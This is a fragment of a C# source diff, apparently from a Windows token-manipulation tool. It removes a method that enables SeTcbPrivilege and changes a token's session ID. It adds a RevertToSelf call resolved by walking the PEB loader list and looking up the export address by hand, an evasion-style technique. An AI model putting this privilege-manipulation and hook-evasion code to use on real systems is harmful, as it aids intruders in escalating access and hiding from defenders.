         ////////////////////////////////////////////////////////////////////////////////
-        public bool SetTokenSessionId(int sessionId)
+        [SecurityCritical]
+        [HandleProcessCorruptedStateExceptions]
+        public bool RevertToSelf()
         {
-            bool exists, enabled;
-            SetWorkingTokenToSelf();
-            TokenInformation.CheckTokenPrivilege(hWorkingToken, Winnt.SE_TCB_NAME, out exists, out enabled);
+            IntPtr hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");
+            IntPtr hRevertToSelf = Generic.GetExportAddress(hadvapi32, "RevertToSelf");
+            MonkeyWorks.advapi32.RevertToSelf fRevertToSelf = (MonkeyWorks.advapi32.RevertToSelf)Marshal.GetDelegateForFunctionPointer(hRevertToSelf, typeof(MonkeyWorks.advapi32.RevertToSelf));
 
-            if (!exists)
-            {
-                Console.WriteLine("[-] SeTcbPrivilege Does Not Exist On Token");
-                return false;
-            }
-
-            SetWorkingTokenToRemote();
-            if (!enabled && !SetTokenPrivilege(Winnt.SE_TCB_NAME, Winnt.TokenPrivileges.SE_PRIVILEGE_ENABLED))
-            {
-                Console.WriteLine("[-] Enable SeTcbPrivilege Failed ");
-                return false;
-            }
-
-            Console.WriteLine("[*] Updating Token Session ID to {0}", sessionId);
-
-            GCHandle handle = new GCHandle();
             try
             {
-                handle = GCHandle.Alloc(sessionId, GCHandleType.Pinned);
-                if (!advapi32.SetTokenInformation(
-                    hWorkingToken,
-                    Winnt._TOKEN_INFORMATION_CLASS.TokenSessionId,
-                    handle.AddrOfPinnedObject(),
-                    sizeof(uint))
-                )
-                {
-                    Misc.GetWin32Error("SetTokenInformation");
-                    return false;
-                }
+                return fRevertToSelf();
             }
             catch (Exception ex)
             {
-                Console.WriteLine(ex.Message);
+                Console.WriteLine("[-] RevertToSelf Generated an Exception");
+                Console.WriteLine("[-] {0}", ex.Message);
+                return false;
             }
-            finally
-            {
-                if (null != handle && handle.IsAllocated)
-                    handle.Free();
-            }
-            return true;
         }
     }
 }
